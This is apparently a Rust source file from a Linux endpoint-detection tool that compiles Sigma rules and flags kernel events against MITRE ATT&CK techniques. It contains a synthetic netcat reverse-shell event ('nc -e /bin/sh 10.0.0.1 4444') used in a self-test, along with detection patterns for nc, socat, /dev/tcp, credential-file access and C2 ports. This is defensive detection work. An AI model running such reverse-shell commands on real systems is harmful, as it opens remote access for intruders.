// ================================================================================
// File:        rules.rs
// Component:   Linux Sentinel — Threat Intelligence & AST Compiler
// Description: Evaluates telemetry against static signatures and dynamic rules.
// Role:        Compiles Sigma YAML rules into an Aho-Corasick Finite State Machine
//              for O(N) multi-pattern matching, paired with a zero-allocation AST
//              for boolean logic evaluation. Cross-references outbound traffic
//              against malicious IP blocklists.
// Author:      Robert Weber
// ================================================================================

use crate::siem::models::{AlertLevel, MitreTactic, RuleMatch};
use crate::config::MasterConfig;
use aho_corasick::AhoCorasick;
use serde::Deserialize;
use serde_norway::Value;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, RwLock};
use tracing::{debug, error, info, trace, warn};

#[derive(Debug, Deserialize)]
struct RawSigmaYaml {
    title: String,
    level: Option<String>,
    tags: Option<Vec<String>>,
    logsource: Option<HashMap<String, Value>>,
    detection: HashMap<String, Value>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum OpType { Exact, Contains, EndsWith, StartsWith }

#[derive(Debug, Clone)]
pub struct PatternTarget {
    pub rule_idx: usize,
    pub selection: String,
    pub op: OpType,
}

pub struct FieldAutomaton {
    pub ac: AhoCorasick,
    pub targets: Vec<PatternTarget>,
}

fn normalize_field(field: &str) -> &'static str {
    let lower = field.to_lowercase();

    // Ports
    if lower == "destinationport" || lower == "dest_port" || lower == "dport" || lower == "dst_port" { "dest_port" }
    else if lower.contains("sourceport") || lower.contains("src_port") || lower == "sport" { "source_port" }

    // Processes (pexe is Auditd for Parent Executable)
    else if lower.contains("parentimage") || lower.contains("parentprocess") || lower == "pexe" { "parent_comm" }
    else if lower.contains("image") || lower.contains("process") || lower.contains("executable") || lower == "app" || lower == "exe" || lower == "comm" { "comm" }

    // Users (uid, auid, euid are standard Linux Auditd fields)
    else if lower == "user" || lower == "username" || lower == "uid" || lower == "euid" || lower == "auid" { "user_name" }

    // Network
    else if lower.contains("ip") || lower.contains("host") || lower.contains("domain") || lower.contains("dest") || lower == "dst" { "dest_ip" }

    // Blanket Fallback for explicitly Linux rules.
    // Auditd and Syslog use dozens of arbitrary field names (tty, cwd, res, msg, a0-a9, cmd6, execve, etc.).
    // By defaulting to "target", we ensure the Aho-Corasick engine scans the full command-line/path
    // for the IOCs rather than dropping the rule completely.
    else { "target" }
}

fn split_outside_parens<'a>(s: &'a str, delimiter: &str) -> Vec<&'a str> {
    let mut parts = Vec::new();
    let mut depth = 0;
    let mut last_idx = 0;
    let delim_len = delimiter.len();
    let bytes = s.as_bytes();

    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'(' { depth += 1; }
        else if bytes[i] == b')' { depth -= 1; }
        else if depth == 0 && s[i..].starts_with(delimiter) {
            parts.push(s[last_idx..i].trim());
            last_idx = i + delim_len;
            i += delim_len - 1;
        }
        i += 1;
    }
    parts.push(s[last_idx..].trim());
    parts
}

#[derive(Debug, Clone)]
pub enum SigmaAST {
    Leaf(String),
    Not(Box<SigmaAST>),
    And(Vec<SigmaAST>),
    Or(Vec<SigmaAST>),
    XOf(usize, String), // Native support for "1 of *", "2 of *"
    AllOf(String),      // Native support for "all of *"
    OneOfThem,
    AllOfThem,
}

impl SigmaAST {
    pub fn compile(cond: &str) -> Self {
        let mut s = cond.trim();
        while s.starts_with('(') && s.ends_with(')') { s = s[1..s.len()-1].trim(); }

        let or_parts = split_outside_parens(s, " or ");
        if or_parts.len() > 1 { return SigmaAST::Or(or_parts.into_iter().map(Self::compile).collect()); }

        let and_parts = split_outside_parens(s, " and ");
        if and_parts.len() > 1 { return SigmaAST::And(and_parts.into_iter().map(Self::compile).collect()); }

        if s.starts_with("not ") { return SigmaAST::Not(Box::new(Self::compile(s[4..].trim()))); }

        if s == "1 of them" || s == "any of them" { return SigmaAST::OneOfThem; }
        if s == "all of them" { return SigmaAST::AllOfThem; }

        if s.contains(" of ") && s.ends_with('*') {
            let parts: Vec<&str> = s.splitn(2, " of ").collect();
            if parts.len() == 2 {
                let prefix = parts[1][..parts[1].len()-1].trim().to_string();
                if parts[0] == "all" { return SigmaAST::AllOf(prefix); }
                if let Ok(num) = parts[0].parse::<usize>() { return SigmaAST::XOf(num, prefix); }
            }
        }
        SigmaAST::Leaf(s.to_string())
    }

    pub fn evaluate(&self, state: &HashMap<String, bool>) -> bool {
        match self {
            SigmaAST::Leaf(name) => *state.get(name).unwrap_or(&false),
            SigmaAST::Not(node) => !node.evaluate(state),
            SigmaAST::And(nodes) => nodes.iter().all(|n| n.evaluate(state)),
            SigmaAST::Or(nodes) => nodes.iter().any(|n| n.evaluate(state)),
            SigmaAST::XOf(num, prefix) => {
                let mut count = 0;
                for (k, &v) in state.iter() {
                    if k.starts_with(prefix) && v {
                        count += 1;
                    }
                }
                count >= *num
            },
            SigmaAST::AllOf(prefix) => {
                let mut total = 0;
                let mut matched = 0;
                for (k, &v) in state.iter() {
                    if k.starts_with(prefix) { total += 1; if v { matched += 1; } }
                }
                total > 0 && total == matched
            },
            SigmaAST::OneOfThem => state.values().any(|&v| v),
            SigmaAST::AllOfThem => state.values().all(|&v| v),
        }
    }
}

pub struct CompiledSigmaRule {
    pub title: String,
    pub level: AlertLevel,
    pub tactic: MitreTactic,
    pub technique: String,
    pub selection_field_counts: HashMap<String, usize>,
    pub condition: SigmaAST,
}

#[derive(Debug, Clone)]
pub struct RawKernelEvent {
    pub ts_ns: u64,
    pub interval_ns: u64,
    pub cgroup_id: u64,
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub event_type: u32,
    pub comm: String,
    pub target: String,
    pub dest_ip: String,
    pub dest_port: u16,
    pub source_port: u16,
    pub parent_comm: String,
    pub user_name: String,
    pub payload: Vec<u8>,
}

pub struct RulesEngine {
    #[allow(dead_code)]
    config: Arc<RwLock<MasterConfig>>,
    compiled_sigma_rules: Arc<RwLock<Vec<CompiledSigmaRule>>>,
    automatons: Arc<RwLock<HashMap<&'static str, FieldAutomaton>>>,
    malicious_ips: Arc<RwLock<HashSet<String>>>,
}

impl RulesEngine {
    pub fn new(config: Arc<RwLock<MasterConfig>>, sigma_path: &str, intel_path: &str) -> Self {
        let engine = Self {
            config,
            compiled_sigma_rules: Arc::new(RwLock::new(Vec::new())),
            automatons: Arc::new(RwLock::new(HashMap::new())),
            malicious_ips: Arc::new(RwLock::new(HashSet::new())),
        };

        engine.load_sigma_rules_sync(sigma_path);
        engine.reload_intel(intel_path);
        engine.verify_alert_pipeline();
        engine
    }

    pub fn reload_intel(&self, ip_path: &str) {
        if let Ok(text) = fs::read_to_string(ip_path) {
            let mut ip_set = HashSet::new();
            for line in text.lines().filter(|l| !l.starts_with('#') && !l.is_empty()) {
                if let Some(ip) = line.split_whitespace().next() {
                    ip_set.insert(ip.to_string());
                }
            }
            let count = ip_set.len();
            if let Ok(mut lock) = self.malicious_ips.write() {
                *lock = ip_set;
            }
            info!(count = count, "Threat Intel Reloaded: Compiled local malicious IP IOCs.");
        } else {
            error!(path = %ip_path, "Threat Intel Reload Failed: Could not read file");
        }
    }

    pub fn reload_sigma_rules(&self, dir_path: &str) {
        self.load_sigma_rules_sync(dir_path);
    }

    /// Returns the total number of dynamic Sigma rules currently mapped in memory.
    pub fn get_rule_count(&self) -> usize {
        self.compiled_sigma_rules.read().map(|rules| rules.len()).unwrap_or(0)
    }

    /// Verifies the evaluation pipeline by injecting a synthetic kernel event.
    /// Returns true if the engine successfully generates a RuleMatch.
    pub fn verify_alert_pipeline(&self) -> bool {
        if self.get_rule_count() == 0 {
            tracing::error!("Sigma diagnostic failed: Cannot verify pipeline with 0 rules loaded.");
            return false;
        }
        let synthetic_event = RawKernelEvent {
            ts_ns: 0,
            interval_ns: 0,
            cgroup_id: 0,
            pid: 99999,
            ppid: 1,
            uid: 0,
            event_type: 1, // EVENT_EXEC
            comm: "nc".to_string(), // Designed to trigger the T1059 reverse shell rule
            target: "-e /bin/sh 10.0.0.1 4444".to_string(),
            dest_ip: "".to_string(),
            dest_port: 0,
            source_port: 0,
            parent_comm: "bash".to_string(),
            user_name: "root".to_string(),
            payload: vec![],
        };

        let result = self.evaluate(&synthetic_event);
        if result.is_some() {
            tracing::info!(count = self.get_rule_count(), "Sigma diagnostic passed: Pipeline successfully evaluated synthetic event.");
            true
        } else {
            tracing::error!("Sigma diagnostic failed: Synthetic event did not trigger a rule match.");
            false
        }
    }

    fn load_sigma_rules_sync(&self, dir_path: &str) {
        let path = Path::new(dir_path);
        if !path.exists() || !path.is_dir() {
            warn!("Sigma directory missing: {}. Falling back to hardcoded statics only.", dir_path);
            return;
        }

        let mut temp_rules = Vec::new();
        let mut pattern_builders: HashMap<&'static str, (Vec<String>, Vec<PatternTarget>)> = HashMap::new();
        let mut walk_queue = vec![PathBuf::from(dir_path)];

        let mut total_files = 0;
        let mut explicit_linux_rules = 0;
        let mut successfully_compiled_linux_rules = 0;
        let mut cross_platform_rules = 0;
        let mut incompatible_os_rules = 0;
        let mut syntax_errors = 0;

        while let Some(dir) = walk_queue.pop() {
            if let Ok(entries) = fs::read_dir(&dir) {
                for entry in entries.flatten() {
                    let file_path = entry.path();
                    if file_path.is_dir() {
                        walk_queue.push(file_path);
                    } else if file_path.extension().and_then(|s| s.to_str()) == Some("yml") {
                        total_files += 1;
                        if let Ok(content) = fs::read_to_string(&file_path) {
                            match serde_norway::from_str::<RawSigmaYaml>(&content) {
                                Ok(raw) => {
                                    // 1. Determine Intended OS Compatibility
                                    let mut is_linux = false;
                                    let mut is_windows = false;
                                    let mut is_mac = false;

                                    if let Some(ref ls) = raw.logsource {
                                        let prod = ls.get("product").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
                                        let os = ls.get("os").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();

                                        if prod == "linux" || os == "linux" { is_linux = true; }
                                        if prod == "windows" || os == "windows" { is_windows = true; }
                                        if prod == "macos" || os == "macos" { is_mac = true; }
                                    }

                                    if is_linux { explicit_linux_rules += 1; }
                                    else if is_windows || is_mac { incompatible_os_rules += 1; }
                                    else { cross_platform_rules += 1; } // e.g., raw network rules

                                    // 2. Compile and Validate
                                    if let Some((rule, targets)) = Self::compile_rule(raw, &file_path.to_string_lossy(), temp_rules.len(), is_linux) {
                                        temp_rules.push(rule);
                                        if is_linux { successfully_compiled_linux_rules += 1; }

                                        for (norm_field, val, target) in targets {
                                            let entry = pattern_builders.entry(norm_field).or_default();
                                            entry.0.push(val);
                                            entry.1.push(target);
                                        }
                                    }
                                },
                                Err(e) => {
                                    syntax_errors += 1;
                                    error!("YAML Syntax Error in {}: {}", file_path.display(), e);
                                }
                            }
                        }
                    }
                }
            }
        }

        let total_compiled = temp_rules.len();
        info!(
            "Sigma Parsing Complete | Files: {} | Linux-Specific: {} | Cross-Platform: {} | Incompatible OS: {} | Syntax Errors: {}",
            total_files, explicit_linux_rules, cross_platform_rules, incompatible_os_rules, syntax_errors
        );

        if successfully_compiled_linux_rules < explicit_linux_rules {
            error!(
                "PIPELINE VALIDATION FAILED: We identified {} explicit Linux rules, but only compiled {}. \
                 This indicates missing field mappings in normalize_field() or malformed rule conditions. \
                 Check the logs for 'CRITICAL MAPPING MISSING' to identify the gaps.",
                 explicit_linux_rules, successfully_compiled_linux_rules
            );
        } else {
            info!("PIPELINE VALIDATION PASSED: 100% of explicit Linux rules ({}/{}) were successfully compiled into the AST, alongside {} compatible cross-platform rules.",
                successfully_compiled_linux_rules, explicit_linux_rules, (total_compiled - successfully_compiled_linux_rules)
            );
        }

        let mut new_automatons = HashMap::new();
        for (field, (patterns, targets)) in pattern_builders {
            match AhoCorasick::builder().ascii_case_insensitive(true).build(&patterns) {
                Ok(ac) => { new_automatons.insert(field, FieldAutomaton { ac, targets }); },
                Err(e) => error!("Failed to compile AhoCorasick FSM for field '{}': {}", field, e),
            }
        }

        if let Ok(mut lock) = self.automatons.write() { *lock = new_automatons; }
        if let Ok(mut lock) = self.compiled_sigma_rules.write() { *lock = temp_rules; }
    }

    fn compile_rule(raw: RawSigmaYaml, file_context: &str, rule_idx: usize, is_explicit_linux: bool) -> Option<(CompiledSigmaRule, Vec<(&'static str, String, PatternTarget)>)> {
        let alert_level = match raw.level.as_deref().unwrap_or("medium").to_lowercase().as_str() {
            "critical" => AlertLevel::Critical,
            "high" => AlertLevel::High,
            "medium" | "low" | "informational" => AlertLevel::Medium,
            _ => AlertLevel::Medium,
        };

        let tactic = raw.tags.as_ref().unwrap_or(&vec![]).iter()
            .find(|t| t.starts_with("attack.") && !t.starts_with("attack.t"))
            .map(|t| match t.as_str() {
                "attack.initial_access" => MitreTactic::InitialAccess,
                "attack.execution" => MitreTactic::Execution,
                "attack.persistence" => MitreTactic::Persistence,
                "attack.privilege_escalation" => MitreTactic::PrivilegeEscalation,
                "attack.defense_evasion" => MitreTactic::DefenseEvasion,
                "attack.credential_access" => MitreTactic::CredentialAccess,
                "attack.discovery" => MitreTactic::Discovery,
                "attack.lateral_movement" => MitreTactic::LateralMovement,
                "attack.collection" => MitreTactic::Collection,
                "attack.command_and_control" | "attack.c2" => MitreTactic::CommandAndControl,
                "attack.exfiltration" => MitreTactic::Exfiltration,
                "attack.impact" => MitreTactic::Impact,
                _ => MitreTactic::Unknown,
            }).unwrap_or(MitreTactic::Unknown);

        let technique = raw.tags.as_ref().unwrap_or(&vec![]).iter()
            .find(|t| t.starts_with("attack.t"))
            .map(|t| t.replace("attack.", "").to_uppercase())
            .unwrap_or_else(|| "Unknown".to_string());

        let mut condition = String::new();
        let mut selection_field_counts = HashMap::new();
        let mut all_targets = Vec::new();

        for (key, val) in raw.detection {
            if key == "condition" {
                condition = val.as_str().unwrap_or("").to_string();
            } else if let Some(sel_map) = val.as_mapping() {
                let mut valid_fields = 0;
                for (f_key, f_val) in sel_map {
                    let field_full = f_key.as_str().unwrap_or("");
                    let mut parts = field_full.split('|');
                    let field_name = parts.next().unwrap_or("");
                    let modifier = parts.next().unwrap_or("");
                    let norm_field = normalize_field(field_name);

                    if norm_field == "unknown" { continue; }
                    valid_fields += 1;

                    let mut extract_val = |v_str: &str| {
                        let (val_str, op) = match modifier {
                            "contains" => (v_str.to_string(), OpType::Contains),
                            "endswith" => (v_str.to_string(), OpType::EndsWith),
                            "startswith" => (v_str.to_string(), OpType::StartsWith),
                            _ => (v_str.to_string(), OpType::Exact),
                        };
                        all_targets.push((norm_field, val_str, PatternTarget { rule_idx, selection: key.clone(), op }));
                    };

                    if let Some(seq) = f_val.as_sequence() {
                        for item in seq { if let Some(s) = item.as_str() { extract_val(s); } }
                    } else if let Some(s) = f_val.as_str() { extract_val(s); }
                }

                if valid_fields == 0 {
                    if is_explicit_linux { warn!("CRITICAL MAPPING MISSING: Linux rule '{}' in {} dropped due to unsupported fields in '{}'.", raw.title, file_context, key); }
                    return None;
                }
                selection_field_counts.insert(key, valid_fields);

            } else if let Some(seq) = val.as_sequence() {
                let mut added_fields = 0;
                for item in seq {
                    if let Some(s) = item.as_str() {
                        added_fields += 1;
                        all_targets.push(("target", s.to_string(), PatternTarget { rule_idx, selection: key.clone(), op: OpType::Contains }));
                        all_targets.push(("comm", s.to_string(), PatternTarget { rule_idx, selection: key.clone(), op: OpType::Contains }));
                    }
                    else if let Some(item_map) = item.as_mapping() {
                        for (f_key, f_val) in item_map {
                            let field_full = f_key.as_str().unwrap_or("");
                            let mut parts = field_full.split('|');
                            let field_name = parts.next().unwrap_or("");
                            let modifier = parts.next().unwrap_or("");
                            let norm_field = normalize_field(field_name);

                            if norm_field == "unknown" { continue; }
                            added_fields += 1;

                            let mut extract_val = |v_str: &str| {
                                let (val_str, op) = match modifier {
                                    "contains" => (v_str.to_string(), OpType::Contains),
                                    "endswith" => (v_str.to_string(), OpType::EndsWith),
                                    "startswith" => (v_str.to_string(), OpType::StartsWith),
                                    _ => (v_str.to_string(), OpType::Exact),
                                };
                                all_targets.push((norm_field, val_str, PatternTarget { rule_idx, selection: key.clone(), op }));
                            };

                            if let Some(sub_seq) = f_val.as_sequence() {
                                for sub_item in sub_seq { if let Some(s) = sub_item.as_str() { extract_val(s); } }
                            } else if let Some(s) = f_val.as_str() { extract_val(s); }
                        }
                    }
                }

                if added_fields == 0 {
                    if is_explicit_linux { warn!("CRITICAL MAPPING MISSING: Linux rule '{}' in {} dropped due to unsupported nested sequence.", raw.title, file_context); }
                    return None;
                }
                selection_field_counts.insert(key, 1);

            } else if let Some(s) = val.as_str() {
                all_targets.push(("target", s.to_string(), PatternTarget { rule_idx, selection: key.clone(), op: OpType::Contains }));
                all_targets.push(("comm", s.to_string(), PatternTarget { rule_idx, selection: key.clone(), op: OpType::Contains }));
                selection_field_counts.insert(key, 1);
            }
        }

        if condition.is_empty() {
            error!("Sigma rule missing 'condition' block: {}", file_context);
            return None;
        }

        Some((
            CompiledSigmaRule { title: raw.title, level: alert_level, tactic, technique, selection_field_counts, condition: SigmaAST::compile(&condition) },
            all_targets
        ))
    }

    /// Helper mathematical function to detect obfuscated payloads
    pub fn calculate_shannon_entropy(data: &[u8]) -> f64 {
        let mut counts = [0u16; 256];
        let mut valid_bytes = 0.0;

        for &byte in data {
            if byte != 0 {
                counts[byte as usize] += 1;
                valid_bytes += 1.0;
            }
        }

        if valid_bytes == 0.0 {
            return 0.0;
        }

        let mut entropy = 0.0;
        for &count in counts.iter() {
            if count > 0 {
                let p = (count as f64) / valid_bytes;
                entropy -= p * p.log2();
            }
        }

        entropy
    }

    /// Evaluates raw telemetry against the compiled Sigma AST and the static MITRE framework
    pub fn evaluate(&self, event: &RawKernelEvent) -> Option<RuleMatch> {
        // Sanitize C-string null padding (\0) from eBPF buffers to ensure math/equality checks work.
        let safe_comm = event.comm.trim_matches(char::from(0)).trim();
        let safe_target = event.target.trim_matches(char::from(0)).trim();
        let safe_parent = event.parent_comm.trim_matches(char::from(0)).trim();
        let safe_user = event.user_name.trim_matches(char::from(0)).trim();
        let safe_dest_ip = event.dest_ip.trim_matches(char::from(0)).trim();

        trace!(event_type = event.event_type, pid = event.pid, comm = %safe_comm, target = %safe_target, "Evaluating Kernel Event");

        // Master Configuration Overrides (Process Whitelisting)
        if let Ok(config) = self.config.read() {
            for exc in &config.exceptions {
                if safe_comm == exc.comm {
                    if exc.targets.is_empty() || exc.targets.iter().any(|t| safe_target.to_lowercase().contains(&t.to_lowercase())) {
                        trace!("Event bypassed via master.toml exception for process: {}", exc.comm);
                        return None;
                    }
                }
            }
        }

        // Thread-Safe Threat Intel Check: Real-time Malicious IP Matching
        if !safe_dest_ip.is_empty() {
            if let Ok(ips) = self.malicious_ips.read() {
                if ips.contains(safe_dest_ip) {
                    return Some(RuleMatch {
                        level: AlertLevel::Critical,
                        mitre_tactic: MitreTactic::CommandAndControl,
                        mitre_technique: "T1071 Standard Application Layer Protocol".to_string(),
                        message: format!("C2 Connection Blocklist Match: Process '{}' connected to known malicious IP {}", safe_comm, safe_dest_ip),
                    });
                }
            }
        }

        // Aho-Corasick Multi-Pattern Mapping
        // Tracks: rule_idx -> selection_name -> distinct matched fields (HashSet ensures OR conditions count as 1 field)
        let mut match_state: HashMap<usize, HashMap<String, HashSet<&'static str>>> = HashMap::new();

        if let Ok(automatons) = self.automatons.read() {
            let mut eval_field = |field_name: &'static str, event_val: &str| {
                if event_val.is_empty() { return; }
                if let Some(auto) = automatons.get(field_name) {
                    for mat in auto.ac.find_overlapping_iter(event_val) {
                        let target = &auto.targets[mat.pattern()];
                        let valid = match target.op {
                            OpType::Exact => mat.start() == 0 && mat.end() == event_val.len(),
                            OpType::StartsWith => mat.start() == 0,
                            OpType::EndsWith => mat.end() == event_val.len(),
                            OpType::Contains => true,
                        };
                        if valid {
                            match_state.entry(target.rule_idx).or_default()
                                       .entry(target.selection.clone()).or_default()
                                       .insert(field_name);
                        }
                    }
                }
            };

            eval_field("target", safe_target);
            eval_field("comm", safe_comm);
            eval_field("parent_comm", safe_parent);
            eval_field("user_name", safe_user);
            eval_field("dest_ip", safe_dest_ip);

            let dport_str = event.dest_port.to_string();
            eval_field("dest_port", &dport_str);

            let sport_str = event.source_port.to_string();
            eval_field("source_port", &sport_str);
        }

        // Evaluate Dynamic AST Logic
        if let Ok(rules) = self.compiled_sigma_rules.read() {
            let empty_selections = HashMap::new();
            for (rule_idx, rule) in rules.iter().enumerate() {
                let rule_selections = match_state.get(&rule_idx).unwrap_or(&empty_selections);
                let mut ast_state = HashMap::new();

                for (sel_name, req_count) in &rule.selection_field_counts {
                    let matched_fields = rule_selections.get(sel_name).map(|s| s.len()).unwrap_or(0);
                    ast_state.insert(sel_name.clone(), matched_fields > 0 && matched_fields >= *req_count);
                }

                if rule.condition.evaluate(&ast_state) {
                    debug!(title = %rule.title, "Threat Intel Triggered via Aho-Corasick & AST");
                    return Some(RuleMatch {
                        level: rule.level.clone(),
                        mitre_tactic: rule.tactic.clone(),
                        mitre_technique: rule.technique.clone(),
                        message: format!("Sigma Signature Match: {}", rule.title),
                    });
                }
            }
        }

        if event.event_type == 1 && (safe_comm == "docker" || safe_comm == "podman") {
            if safe_target.contains("exec ") && (safe_target.contains("/bin/sh") || safe_target.contains("/bin/bash")) {
                warn!(comm = %safe_comm, target = %safe_target, "Rule Match [T1609]: Interactive shell spawned inside container");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::Execution,
                    mitre_technique: "T1609 Container Administration Command".to_string(),
                    message: format!("Interactive shell injection via container daemon detected: {}", safe_target),
                });
            }
        }

        // High-Speed Static Fast-Path Fallbacks
        match event.event_type {
            // EVENT_EXEC
            1 => {
                if safe_comm == "nc" || safe_comm == "socat" || safe_target.contains("/dev/tcp") {
                    debug!(comm = %safe_comm, "Rule Match [T1059]: Reverse shell detected");
                    return Some(RuleMatch {
                        level: AlertLevel::Critical,
                        mitre_tactic: MitreTactic::Execution,
                        mitre_technique: "T1059 Command and Scripting Interpreter".to_string(),
                        message: format!("Reverse shell execution detected via '{}'", safe_comm),
                    });
                }
            },
            // EVENT_OPEN_CRIT (File Integrity)
            2 => {
                if safe_target.starts_with("/etc/shadow") || safe_target.starts_with("/etc/sudoers") {
                    debug!(target = %safe_target, "Rule Match [T1078]: Critical file modification");
                    return Some(RuleMatch {
                        level: AlertLevel::Critical,
                        mitre_tactic: MitreTactic::PrivilegeEscalation,
                        mitre_technique: "T1078 Valid Accounts".to_string(),
                        message: format!("Critical credential file modified by '{}': {}", safe_comm, safe_target),
                    });
                }
            },
            // EVENT_CONNECT (C2 Beacons)
            3 => {
                // High-fidelity fast-path match for known default C2, exploit framework, and backdoor ports.
                // Advanced C2s hiding on 443/80 will bypass this static check and be caught downstream by
                // the ML/UEBA engine's timing_cv (beaconing) and payload_entropy evaluations.
                if matches!(event.dest_port,
                    // Generic Reverse Shells & Script-Kiddie Defaults
                    4444 | 5555 | 8888 | 44444 |
                    // Legacy/Elite Backdoors (Netbus, BackOrifice, IRC Botnets)
                    1337 | 31337 | 12345 | 666 | 6667 |
                    // Cobalt Strike Team Server Default
                    50050 |
                    // Sliver / Havoc / Empire / PoshC2 Default Listeners
                    3133 | 4000 | 47000 | 49999 |
                    // Cryptojacking Stratum protocol defaults (Monero)
                    3333 | 7777 | 9000
                ) {
                    debug!(dest_ip = %safe_dest_ip, dest_port = event.dest_port, "Rule Match [T1571]: Outbound C2/Malicious connection");
                    return Some(RuleMatch {
                        level: AlertLevel::High,
                        mitre_tactic: MitreTactic::CommandAndControl,
                        mitre_technique: "T1571 Non-Standard Port".to_string(),
                        message: format!(
                            "Suspicious outbound C2/Backdoor connection from '{}' to {}:{}",
                            safe_comm, safe_dest_ip, event.dest_port
                        ),
                    });
                }
            },
            // EVENT_PTRACE
            4 => {
                debug!(pid = event.pid, comm = %safe_comm, "Rule Match [T1055.008]: Ptrace injection");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::DefenseEvasion,
                    mitre_technique: "T1055.008 Ptrace System Calls".to_string(),
                    message: format!("Process injection (ptrace) initiated by '{}' on PID {}", safe_comm, event.pid),
                });
            },
            // EVENT_MEMFD (Reflective Code Loading)
            5 => {
                // Ignore legitimate GUI/Audio shared memory buffers
                if !safe_target.contains("wayland") && !safe_target.contains("gdk-wayland") && !safe_target.contains("pulseaudio") && !safe_target.contains("xauth") {
                    debug!(comm = %safe_comm, "Rule Match [T1620]: memfd_create fileless execution");
                    return Some(RuleMatch {
                        level: AlertLevel::Critical,
                        mitre_tactic: MitreTactic::DefenseEvasion,
                        mitre_technique: "T1620 Reflective Code Loading".to_string(),
                        message: format!("Reflective code loading (memfd_create) by '{}'. Target: {}", safe_comm, safe_target),
                    });
                }
            },
            // EVENT_MODULE (Kernel Rootkits)
            6 => {
                debug!(comm = %safe_comm, "Rule Match [T1547.006]: Kernel module manipulation");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::Persistence,
                    mitre_technique: "T1547.006 Kernel Modules and Extensions".to_string(),
                    message: format!("Kernel module manipulation initiated by '{}'", safe_comm),
                });
            },
            // EVENT_BPF (EDR Tampering)
            7 => {
                debug!(comm = %safe_comm, "Rule Match [T1562.001]: eBPF tampering attempt");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::DefenseEvasion,
                    mitre_technique: "T1562.001 Impair Defenses".to_string(),
                    message: format!("eBPF tampering/blinding attempt detected by '{}'", safe_comm),
                });
            },
            // EVENT_UDP_SEND (DNS Tunneling)
            8 => {
                let entropy = Self::calculate_shannon_entropy(&event.payload);
                if entropy > 4.5 {
                    debug!(entropy = entropy, comm = %safe_comm, "Rule Match [T1071.004]: High entropy UDP payload");
                    return Some(RuleMatch {
                        level: AlertLevel::High,
                        mitre_tactic: MitreTactic::CommandAndControl,
                        mitre_technique: "T1071.004 DNS".to_string(),
                        message: format!("High entropy UDP payload detected (Entropy: {:.2}). Possible DNS tunneling by '{}'", entropy, safe_comm),
                    });
                }
            },
            // EVENT_DELETE_MODULE
            9 => {
                debug!(comm = %safe_comm, target = %safe_target, "Rule Match [T1547.006]: Kernel module unloaded");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::DefenseEvasion,
                    mitre_technique: "T1547.006 Kernel Modules".to_string(),
                    message: format!("Kernel module unloaded by '{}'. Target: {}", safe_comm, safe_target),
                });
            },
            // EVENT_UNLINK (File Deletion)
            10 => {
                // Only alert if the deleted file is in a critical directory or is a known log file
                if safe_target.starts_with("/var/log/") || safe_target.starts_with("/etc/") || safe_target.contains("bash_history") || safe_target.contains("audit.log") {
                    debug!(comm = %safe_comm, target = %safe_target, "Rule Match [T1070.004]: File deletion");
                    return Some(RuleMatch {
                        level: AlertLevel::Medium,
                        mitre_tactic: MitreTactic::DefenseEvasion,
                        mitre_technique: "T1070.004 File Deletion".to_string(),
                        message: format!("Sensitive log/config file deletion detected by '{}'. Target: {}", safe_comm, safe_target),
                    });
                }
            },
            // EVENT_RENAME
            11 => {
                debug!(comm = %safe_comm, target = %safe_target, "Rule Match [T1036]: File masquerading/rename");
                return Some(RuleMatch {
                    level: AlertLevel::Medium,
                    mitre_tactic: MitreTactic::DefenseEvasion,
                    mitre_technique: "T1036 Masquerading".to_string(),
                    message: format!("File rename operation by '{}'. Target: {}", safe_comm, safe_target),
                });
            },
            // EVENT_SETUID
            12 => {
                debug!(comm = %safe_comm, "Rule Match [T1548]: UID 0 escalation");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::PrivilegeEscalation,
                    mitre_technique: "T1548 Abuse Elevation Control".to_string(),
                    message: format!("Privilege escalation to UID 0 attempted by '{}'", safe_comm),
                });
            },
            // EVENT_MOUNT
            13 => {
                debug!(comm = %safe_comm, target = %safe_target, "Rule Match [T1006]: Volume mount");
                return Some(RuleMatch {
                    level: AlertLevel::High,
                    mitre_tactic: MitreTactic::Execution,
                    mitre_technique: "T1006 Direct Volume Access".to_string(),
                    message: format!("Filesystem mount operation by '{}'. Mapping: {}", safe_comm, safe_target),
                });
            },
            // EVENT_BIND
            14 => {
                // Ignore Port 0 (Kernel Ephemeral Port Assignment)
                if event.dest_port != 0 {
                    debug!(comm = %safe_comm, dest_port = event.dest_port, "Rule Match [T1571]: Socket bind");
                    return Some(RuleMatch {
                        level: AlertLevel::High,
                        mitre_tactic: MitreTactic::CommandAndControl,
                        mitre_technique: "T1571 Non-Standard Port".to_string(),
                        message: format!("Socket bind detected by '{}'. Port: {}", safe_comm, event.dest_port),
                    });
                }
            },
            // EVENT_UNSHARE (Container Escape / Namespace Isolation Breakdown)
            15 => {
                debug!(comm = %safe_comm, "Rule Match [T1611]: Unshare namespace manipulation");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::PrivilegeEscalation,
                    mitre_technique: "T1611 Escape to Host".to_string(),
                    message: format!("Container escape attempt (namespace unshare) initiated by '{}'", safe_comm),
                });
            },
            // EVENT_PIVOT_ROOT (Container Escape / RootFS Jailbreak)
            16 => {
                debug!(comm = %safe_comm, target = %safe_target, "Rule Match [T1611]: Pivot_root execution");
                return Some(RuleMatch {
                    level: AlertLevel::Critical,
                    mitre_tactic: MitreTactic::PrivilegeEscalation,
                    mitre_technique: "T1611 Escape to Host".to_string(),
                    message: format!("Root filesystem pivot detected by '{}'. Target: {}", safe_comm, safe_target),
                });
            },
            _ => {
                trace!("Unhandled event type: {}", event.event_type);
            }
        }
        trace!("Event evaluated cleanly. No rules triggered. Velocity: {}ns", event.interval_ns);
        None
    }
}